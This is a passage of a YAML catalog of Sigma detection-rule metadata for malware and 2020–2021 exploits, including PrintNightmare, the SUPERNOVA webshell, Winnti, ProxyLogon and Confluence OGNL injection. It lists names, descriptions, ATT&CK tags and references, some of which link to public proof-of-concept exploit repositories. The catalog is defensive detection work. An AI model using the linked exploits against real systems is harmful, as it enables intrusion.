  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a2cee20b-eacc-459f-861d-c02e5d12f1db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/SolarWinds-Supply-Chain/web_solarwinds_supernova_webshell.yml
  name: Solarwinds SUPERNOVA Webshell Access
  description: Detects access to SUPERNOVA webshell as described in Guidepoint report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.guidepointsecurity.com/supernova-solarwinds-net-webshell-analysis/
  - https://www.anquanke.com/post/id/226029
  false_positives:
  - Unknown
  notes: ''
- detection_id: d1aa3382-abab-446f-96ea-4de52908210b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/TAIDOOR-RAT/proc_creation_win_apt_taidoor.yml
  name: TAIDOOR RAT DLL Load
  description: Detects specific process characteristics of Chinese TAIDOOR RAT malware
    load
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1055.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.execution
  - attack.t1055.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://us-cert.cisa.gov/ncas/analysis-reports/ar20-216a
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3121461b-5aa0-4a41-b910-66d25524edbb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/Winnti/proc_creation_win_apt_winnti_mal_hk_jan20.yml
  name: Winnti Malware HK University Campaign
  description: Detects specific process characteristics of Winnti malware noticed
    in Dec/Jan 2020 in a campaign against Honk Kong universities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  - attack.g0044
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 73d70463-75c9-4258-92c6-17500fe972f2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2020/TA/Winnti/proc_creation_win_apt_winnti_pipemon.yml
  name: Winnti Pipemon Characteristics
  description: Detects specific process characteristics of Winnti Pipemon malware
    reported by ESET
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  - attack.g0044
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/
  false_positives:
  - Legitimate setups that use similar flags
  notes: ''
- detection_id: 6fe1719e-ecdf-4caf-bffe-4f501cb0a561
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-1675/av_exploit_cve_2021_34527_print_nightmare.yml
  name: Antivirus PrinterNightmare CVE-2021-34527 Exploit Detection
  description: Detects the suspicious file that is created from PoC code against Windows
    Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare),
    CVE-2021-1675 .
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: ''
  product: ''
  category: antivirus
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - detection.emerging-threats
  - cve.2021-34527
  - cve.2021-1675
  time_window: ''
  references:
  - https://twitter.com/mvelazco/status/1410291741241102338
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
  false_positives:
  - Unlikely, or pending PSP analysis
  notes: ''
- detection_id: 5b2bbc47-dead-4ef7-8908-0cf73fcbecbf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-1675/file_delete_win_exploit_cve_2021_1675_print_nightmare.yml
  name: Potential PrintNightmare Exploitation Attempt
  description: Detect DLL deletions from Spooler Service driver folder. This might
    be a potential exploitation attempt of CVE-2021-1675
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_delete
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574
  - cve.2021-1675
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20210629055600/https://github.com/hhlxf/PrintNightmare/
  - https://github.com/cube0x0/CVE-2021-1675
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2131cfb3-8c12-45e8-8fa0-31f5924e9f07
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-1675/file_event_win_exploit_cve_2021_1675_printspooler.yml
  name: CVE-2021-1675 Print Spooler Exploitation Filename Pattern
  description: Detects the default filename used in PoC code against print spooler
    vulnerability CVE-2021-1675
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1587
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.resource-development
  - attack.t1587
  - cve.2021-1675
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20210629055600/https://github.com/hhlxf/PrintNightmare/
  - https://web.archive.org/web/20210701042336/https://github.com/afwu/PrintNightmare
  - https://github.com/cube0x0/CVE-2021-1675
  false_positives:
  - Unknown
  notes: ''
- detection_id: 02fb90de-c321-4e63-a6b9-25f4b03dfd14
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-1675/image_load_exploit_cve_2021_1675_spoolsv_dll_load.yml
  name: Windows Spooler Service Suspicious Binary Load
  description: 'Detect DLL Load from Spooler Service backup folder. This behavior
    has been observed during the exploitation of the Print Spooler Vulnerability CVE-2021-1675
    and CVE-2021-34527 (PrinterNightmare).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574
  - cve.2021-1675
  - cve.2021-34527
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20210629055600/https://github.com/hhlxf/PrintNightmare/
  - https://github.com/ly4k/SpoolFool
  false_positives:
  - Loading of legitimate driver
  notes: ''
- detection_id: ba6b9e43-1d45-4d3c-a504-1043a64c8469
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-1675/registry_event_cve_2021_1675_mimikatz_printernightmare_drivers.yml
  name: PrinterNightmare Mimikatz Driver Name
  description: Detects static QMS 810 and mimikatz driver name used by Mimikatz as
    exploited in CVE-2021-1675 and CVE-2021-34527
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204
  tags:
  - attack.execution
  - attack.t1204
  - cve.2021-1675
  - cve.2021-34527
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/gentilkiwi/mimikatz/commit/c21276072b3f2a47a21e215a46962a17d54b3760
  - https://www.lexjansen.com/sesug/1993/SESUG93035.pdf
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913
  - https://nvd.nist.gov/vuln/detail/cve-2021-1675
  - https://nvd.nist.gov/vuln/detail/cve-2021-34527
  false_positives:
  - Legitimate installation of printer driver QMS 810, Texas Instruments microLaser
    printer (unlikely)
  notes: ''
- detection_id: 4e64668a-4da1-49f5-a8df-9e2d5b866718
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-1675/win_exploit_cve_2021_1675_printspooler.yml
  name: Possible CVE-2021-1675 Print Spooler Exploitation
  description: Detects events of driver load errors in print service logs that could
    be a sign of successful exploitation attempts of print spooler vulnerability CVE-2021-1675
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: printservice-admin
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569
  tags:
  - attack.execution
  - attack.t1569
  - cve.2021-1675
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20210629055600/https://github.com/hhlxf/PrintNightmare/
  - https://web.archive.org/web/20210701042336/https://github.com/afwu/PrintNightmare
  - https://twitter.com/fuzzyf10w/status/1410202370835898371
  false_positives:
  - Problems with printer drivers
  notes: ''
- detection_id: f34d942d-c8c4-4f1f-b196-22471aecf10a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-1675/win_exploit_cve_2021_1675_printspooler_operational.yml
  name: CVE-2021-1675 Print Spooler Exploitation
  description: Detects driver load events print service operational log that are a
    sign of successful exploitation attempts against print spooler vulnerability CVE-2021-1675
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: printservice-operational
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569
  tags:
  - attack.execution
  - attack.t1569
  - cve.2021-1675
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/MalwareJake/status/1410421967463731200
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8fe1c584-ee61-444b-be21-e9054b229694
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-1675/win_security_exploit_cve_2021_1675_printspooler_security.yml
  name: CVE-2021-1675 Print Spooler Exploitation IPC Access
  description: Detects remote printer driver load from Detailed File Share in Security
    logs that are a sign of successful exploitation attempts against print spooler
    vulnerability CVE-2021-1675 and CVE-2021-34527
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569
  tags:
  - attack.execution
  - attack.t1569
  - cve.2021-1675
  - cve.2021-34527
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/INIT_3/status/1410662463641731075
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7b33baef-2a75-4ca3-9da4-34f9a15382d8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-1675/zeek_dce_rpc_exploit_cve_2021_1675_printnightmare_print_driver_install.yml
  name: Possible PrintNightmare Print Driver Install - CVE-2021-1675
  description: 'Detects the remote installation of a print driver which is possible
    indication of the exploitation of PrintNightmare (CVE-2021-1675).

    The occurrence of print drivers being installed remotely via RPC functions should
    be rare, as print drivers are normally installed locally and or through group
    policy.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: stable
  platform: zeek
  product: dce_rpc
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2021-1678
  - cve.2021-1675
  - cve.2021-34527
  - detection.emerging-threats
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-par/93d1915d-4d9f-4ceb-90a7-e8f2a59adc29
  - https://github.com/zeek/zeek/blob/691b099de13649d6576c7b9d637f8213ff818832/scripts/base/protocols/dce-rpc/consts.zeek
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
  - https://github.com/corelight/CVE-2021-1675
  - https://old.zeek.org/zeekweek2019/slides/bzar.pdf
  - https://www.crowdstrike.com/blog/cve-2021-1678-printer-spooler-relay-security-advisory/
  false_positives:
  - Legitimate remote alteration of a printer driver.
  notes: ''
- detection_id: f0500377-bc70-425d-ac8c-e956cd906871
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-20090/web_cve_2021_20090_2021_20091_arcadyan_router_exploit.yml
  name: Arcadyan Router Exploitations
  description: Detects exploitation of vulnerabilities in Arcadyan routers as reported
    in CVE-2021-20090 and CVE-2021-20091.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-20090
  - cve.2021-20091
  - detection.emerging-threats
  time_window: ''
  references:
  - https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2
  - https://www.tenable.com/security/research/tra-2021-13
  - https://blogs.juniper.net/en-us/security/freshly-disclosed-vulnerability-cve-2021-20090-exploited-in-the-wild
  false_positives:
  - Unknown
  notes: ''
- detection_id: 687f6504-7f44-4549-91fc-f07bab065821
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-2109/web_cve_2021_2109_weblogic_rce_exploit.yml
  name: Oracle WebLogic Exploit CVE-2021-2109
  description: Detects the exploitation of the WebLogic server vulnerability described
    in CVE-2021-2109
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.t1190
  - attack.initial-access
  - cve.2021-2109
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/pyn3rd/status/1351696768065409026
  - https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw
  false_positives:
  - Unknown
  notes: ''
- detection_id: 179ed852-0f9b-4009-93a7-68475910fd86
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-21972/web_cve_2021_21972_vsphere_unauth_rce_exploit.yml
  name: CVE-2021-21972 VSphere Exploitation
  description: Detects the exploitation of VSphere Remote Code Execution vulnerability
    as described in CVE-2021-21972
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-21972
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.vmware.com/security/advisories/VMSA-2021-0002.html
  - https://f5.pm/go-59627.html
  - https://swarm.ptsecurity.com/unauth-rce-vmware
  false_positives:
  - OVA uploads to your VSphere appliance
  notes: ''
- detection_id: 77586a7f-7ea4-4c41-b19c-820140b84ca9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-21978/web_cve_2021_21978_vmware_view_planner_exploit.yml
  name: CVE-2021-21978 Exploitation Attempt
  description: Detects the exploitation of the VMware View Planner vulnerability described
    in CVE-2021-21978
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-21978
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/wugeej/status/1369476795255320580
  - https://paper.seebug.org/1495/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b014ea07-8ea0-4859-b517-50a4e5b7ecec
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-22005/web_cve_2021_22005_vmware_file_upload.yml
  name: VMware vCenter Server File Upload CVE-2021-22005
  description: Detects exploitation attempts using file upload vulnerability CVE-2021-22005
    in the VMWare vCenter Server.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-22005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://kb.vmware.com/s/article/85717
  - https://www.tenable.com/blog/cve-2021-22005-critical-file-upload-vulnerability-in-vmware-vcenter-server
  false_positives:
  - Vulnerability Scanning
  notes: ''
- detection_id: f425637f-891c-4191-a6c4-3bb1b70513b4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-22123/web_cve_2021_22123_fortinet_exploit.yml
  name: Fortinet CVE-2021-22123 Exploitation
  description: Detects CVE-2021-22123 exploitation attempt against Fortinet WAFs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-22123
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.rapid7.com/blog/post/2021/08/17/fortinet-fortiweb-os-command-injection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5525edac-f599-4bfd-b926-3fa69860e766
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-22893/web_cve_2021_22893_pulse_secure_rce_exploit.yml
  name: Pulse Connect Secure RCE Attack CVE-2021-22893
  description: This rule detects exploitation attempts using Pulse Connect Secure(PCS)
    vulnerability (CVE-2021-22893)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: stable
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-22893
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html
  - https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784
  false_positives:
  - Vulnerability Scanning
  notes: ''
- detection_id: 245f92e3-c4da-45f1-9070-bc552e06db11
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-26084/proc_creation_win_exploit_cve_2021_26084_atlassian_confluence.yml
  name: Potential Atlassian Confluence CVE-2021-26084 Exploitation Attempt
  description: Detects spawning of suspicious child processes by Atlassian Confluence
    server which may indicate successful exploitation of CVE-2021-26084
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1190
  tags:
  - attack.initial-access
  - attack.execution
  - attack.t1190
  - attack.t1059
  - cve.2021-26084
  - detection.emerging-threats
  time_window: ''
  references:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-26084
  - https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
  - https://github.com/h3v0x/CVE-2021-26084_Confluence
  false_positives:
  - Unknown
  notes: ''
- detection_id: 38825179-3c78-4fed-b222-2e2166b926b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-26084/web_cve_2021_26084_confluence_rce_exploit.yml
  name: Potential CVE-2021-26084 Exploitation Attempt
  description: Detects potential exploitation of CVE-2021-260841 a Confluence RCE
    using OGNL injection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-26084
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/TesterCC/exp_poc_library/blob/be61622600ec79d8fba2fa5f816a870715f0cb3b/exp_poc/CVE-2021-26084_Confluence_OGNL_injection/CVE-2021-26084.md
  - https://github.com/httpvoid/writeups/blob/62d3751945289d088ccfdf4d0ffbf61598a2cd7d/Confluence-RCE.md
  - https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html
  - https://mraddon.blog/2017/03/20/confluence-trick-to-create-pages-from-blueprint-templates/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b9888738-29ed-4c54-96a4-f38c57b84bb3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-26814/web_cve_2021_26814_wzuh_rce.yml
  name: Exploitation of CVE-2021-26814 in Wazuh
  description: Detects the exploitation of the Wazuh RCE vulnerability described in
    CVE-2021-26814
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-21978
  - cve.2021-26814
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/WickdDavid/CVE-2021-26814/blob/6a17355a10ec4db771d0f112cbe031e418d829d5/PoC.py
  false_positives:
  - Unknown
  notes: ''
- detection_id: cd479ccc-d8f0-4c66-ba7d-e06286f3f887
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-26857/proc_creation_win_exploit_cve_2021_26857_msexchange.yml
  name: Potential CVE-2021-26857 Exploitation Attempt
  description: Detects possible successful exploitation for vulnerability described
    in CVE-2021-26857 by looking for | abnormal subprocesses spawning by Exchange
    Server's Unified Messaging service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  tags:
  - attack.t1203
  - attack.execution
  - cve.2021-26857
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b06335b3-55ac-4b41-937e-16b7f5d57dfd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-26858/file_event_win_cve_2021_26858_msexchange.yml
  name: CVE-2021-26858 Exchange Exploitation
  description: 'Detects possible successful exploitation for vulnerability described
    in CVE-2021-26858 by looking for

    creation of non-standard files on disk by Exchange Servers Unified Messaging
    service

    which could indicate dropping web shells or other malicious content

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  tags:
  - attack.t1203
  - attack.execution
  - cve.2021-26858
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
  false_positives:
  - Unknown
  notes: ''
- detection_id: effee1f6-a932-4297-a81f-acb44064fa3a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-26858/web_cve_2021_26858_iis_rce.yml
  name: ProxyLogon Reset Virtual Directories Based On IIS Log
  description: When exploiting this vulnerability with CVE-2021-26858, an SSRF attack
    is used to manipulate virtual directories
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - cve.2021-26858
  - detection.emerging-threats
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon-cve-2021-26855-26858-27065-26857-6e885c5f197c
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 0bbcd74b-0596-41a4-94a0-4e88a76ffdb3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-27905/web_cve_2021_27905_apache_solr_exploit.yml
  name: Potential CVE-2021-27905 Exploitation Attempt
  description: Detects exploitation attempt of the CVE-2021-27905 which affects all
    Apache Solr versions prior to and including 8.8.1.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-27905
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/Al1ex4/status/1382981479727128580
  - https://twitter.com/sec715/status/1373472323538362371
  - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
  - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186
  - https://github.com/murataydemir/CVE-2021-27905
  false_positives:
  - Vulnerability Scanners
  notes: ''
- detection_id: a2a9d722-0acb-4096-bccc-daaf91a5037b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-28480/web_cve_2021_28480_exchange_exploit.yml
  name: Exchange Exploitation CVE-2021-28480
  description: Detects successful exploitation of Exchange vulnerability as reported
    in CVE-2021-28480
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-28480
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/GossiTheDog/status/1392965209132871683?s=20
  false_positives:
  - Unknown
  notes: ''
- detection_id: 56973b50-3382-4b56-bdf5-f51a3183797a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-33766/web_cve_2021_33766_msexchange_proxytoken.yml
  name: CVE-2021-33766 Exchange ProxyToken Exploitation
  description: Detects the exploitation of Microsoft Exchange ProxyToken vulnerability
    as described in CVE-2021-33766
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-33766
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server
  false_positives:
  - Unknown
  notes: ''
- detection_id: ad7085ac-92e4-4b76-8ce2-276d2c0e68ef
  source_id: sigmahq_sigma
